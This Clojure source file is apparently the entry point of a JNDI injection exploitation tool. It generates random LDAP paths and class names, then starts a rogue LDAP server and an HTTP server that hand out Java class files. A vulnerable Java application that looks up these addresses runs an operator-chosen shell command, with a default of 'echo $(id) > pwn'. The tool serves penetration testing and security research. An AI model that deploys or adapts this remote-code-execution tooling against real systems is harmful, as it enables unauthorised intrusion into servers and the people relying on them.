(ns jndi-injector-clj.core
  (:require [clojure.pprint :as pp]
            [jndi-injector-clj.ldap :as ldap]
            [jndi-injector-clj.server :as server]
            [clojure.tools.cli :refer [parse-opts]])
  (:gen-class))

(def charset
  (->> (concat (range 48 58) (range 97 123))
       (map #(char %))))

(defn pick-char []
  (->> (count charset)
       (rand-int)
       (nth charset)))

(defn gen-str []
  (loop [index 6 string ""]
    (if (zero? index)
      string
      (recur (dec index) (str string (pick-char))))))

(defn gen-conf [options]
  {:port    (:port options)
   :command (:command options)
   :java7 {:ldap-base (gen-str) :class-name (gen-str)}
   :java8 {:ldap-base (gen-str) :class-name (gen-str)}})

(defn format-conf [app-conf]
  [{"Java version" "7"
    "LDAP address" (str "ldap://localhost:1389/" (:ldap-base (:java7 app-conf)))
    "URL" (str "http://localhost:" (:port app-conf) "/" (:class-name (:java7 app-conf)) ".class")}
   {"Java version" "8"
    "LDAP address" (str "ldap://localhost:1389/" (:ldap-base (:java8 app-conf)))
    "URL" (str "http://localhost:" (:port app-conf) "/" (:class-name (:java8 app-conf)) ".class")}])

(def cli-options
  [["-c" "--command COMMAND" "command to execute"
    :default "echo $(id) > pwn"]
   ["-p" "--port PORT" "webserver port"
    :default 3000
    :parse-fn #(Integer/parseInt %)
    :validate [#(< 0 % 0x10000) "Must be a number between 0 and 65536"]]
   ["-h" "--help"]])

(defn -main [& args]
  (let [options (:options (parse-opts args cli-options))
        app-conf (gen-conf options)
        _ (println "\nOPTIONS:")
        _ (pp/print-table [{"Command"(:command options)}])
        _ (println "\nLDAP addresses:")
        _ (pp/print-table (format-conf app-conf))
        _ (println "\n")]
    (.start (Thread. (fn [] (ldap/start app-conf))))
    (server/start app-conf)))
